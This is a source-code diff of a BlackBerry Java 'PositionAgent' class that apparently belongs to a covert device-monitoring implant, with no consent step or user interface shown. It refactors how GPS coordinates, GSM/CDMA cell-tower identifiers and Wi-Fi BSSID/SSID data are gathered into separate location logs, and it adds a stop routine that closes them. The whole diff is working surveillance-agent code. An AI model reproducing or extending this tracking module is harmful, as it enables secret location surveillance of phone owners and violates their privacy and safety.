@@ -33,6 +33,7 @@ import blackberry.Conf;
 import blackberry.Device;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
@@ -54,6 +55,10 @@ public final class PositionAgent extends Agent implements LocationListener {
     private static final int LOG_TYPE_IP = 4;
     private static final int LOG_TYPE_CDMA = 5;
     //private static final int TYPE_GPS_ASSISTED = 3;
+    
+    Log logGps;
+    Log logCell;
+    Log logWifi;
 
     //#ifdef DEBUG
     static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);
@@ -84,6 +89,9 @@ public final class PositionAgent extends Agent implements LocationListener {
         super(AGENT_POSITION, agentStatus, Conf.AGENT_POSITION_ON_SD,
                 "PositionAgent");
 
+        logWifi=log;
+        logGps = new Log(log);
+        logCell = new Log(log);
     }
 
     /**
@@ -128,6 +136,19 @@ public final class PositionAgent extends Agent implements LocationListener {
             debug.error(e);
             //#endif
         }
+        
+        if (gpsEnabled && lp != null) {
+            
+            logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS), LogType.LOCATION_NEW);
+        }
+        if (cellEnabled) {
+            if(Device.isCDMA()){
+                logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA), LogType.LOCATION_NEW);
+            }else{
+                logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM), LogType.LOCATION_NEW); 
+            }
+        }                       
+        
     }
 
     /*
@@ -135,7 +156,7 @@ public final class PositionAgent extends Agent implements LocationListener {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        if (gpsEnabled && lp != null) {
+        if (gpsEnabled) {
             locationGPS();
         }
         if (cellEnabled) {
@@ -146,6 +167,17 @@ public final class PositionAgent extends Agent implements LocationListener {
         }
     }
 
+    public void actualStop() {
+        
+        if (gpsEnabled) {
+            logGps.close();
+        }
+        if (cellEnabled) {
+            logCell.close();
+        }
+
+    }
+    
     private void locationWIFI() {
         final WLANAPInfo wifi = WLANInfo.getAPInfo();
         if (wifi != null) {
@@ -154,7 +186,10 @@ public final class PositionAgent extends Agent implements LocationListener {
             //#endif
             byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(),
                     wifi.getSignalLevel());
-            saveLogNew(payload, 1, LOG_TYPE_WIFI);
+            
+            logWifi.createLog(getAdditionalData(1, LOG_TYPE_WIFI), LogType.LOCATION_NEW);
+            logWifi.writeLog(payload);
+            logWifi.close();            
         } else {
             //#ifdef DEBUG_WARN
             debug.warn("Wifi disabled");
@@ -198,7 +233,7 @@ public final class PositionAgent extends Agent implements LocationListener {
             //#endif
 
             byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
-            saveLog(payload, LOG_TYPE_GSM);
+            saveLog(logCell, payload, LOG_TYPE_GSM);
 
         } else {
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
@@ -222,7 +257,7 @@ public final class PositionAgent extends Agent implements LocationListener {
             //#endif
 
             byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
-            saveLog(payload, LOG_TYPE_CDMA);
+            saveLog(logCell, payload, LOG_TYPE_CDMA);
         }
 
     }
@@ -274,7 +309,7 @@ public final class PositionAgent extends Agent implements LocationListener {
                 //#endif
                 if (loc.isValid()) {
                     byte[] payload = getGPSPayload(qc, timestamp);
-                    saveLog(payload, TYPE_GPS);
+                    saveLog(logGps, payload, TYPE_GPS);
                 }
 
             } else {
@@ -285,17 +320,8 @@ public final class PositionAgent extends Agent implements LocationListener {
         }
     }
 
-    private void saveLogNew(byte[] payload, int structNum, int type) {
-
-        //#ifdef DBC
-        Check.requires(payload != null, "saveLog payload!= null");
-        //#endif
-
-        //#ifdef DEBUG_TRACE
-        debug.trace("saveLog payload: " + payload.length);
-        debug.trace(Utils.byteArrayToHex(payload));
-        //#endif
-
+    private byte[] getAdditionalData(int structNum, int type) {
+       
         int addsize = 12;
         byte[] additionalData = new byte[addsize];
         final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
@@ -311,13 +337,10 @@ public final class PositionAgent extends Agent implements LocationListener {
                 "addbuffer wrong size");
         //#endif
 
-        // save log
-        log.createLog(additionalData, LogType.LOCATION_NEW);
-        log.writeLog(payload);
-        log.close();
+        return additionalData;
     }
 
-    private void saveLog(byte[] payload, int type) {
+    private void saveLog(Log log, byte[] payload, int type) {
 
         //#ifdef DBC
         Check.requires(payload != null, "saveLog payload!= null");
@@ -355,9 +378,9 @@ public final class PositionAgent extends Agent implements LocationListener {
         //#endif
 
         // save log
-        log.createLog(null, LogType.LOCATION);
+        //log.createLog(null, LogType.LOCATION);
         log.writeLog(message);
-        log.close();
+        //log.close();
     }
 
     private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
@@ -550,9 +573,6 @@ public final class PositionAgent extends Agent implements LocationListener {
         return gpsPosition;
     }
 
-    public void actualStop() {
-
-    }
 
     /*
      * (non-Javadoc)
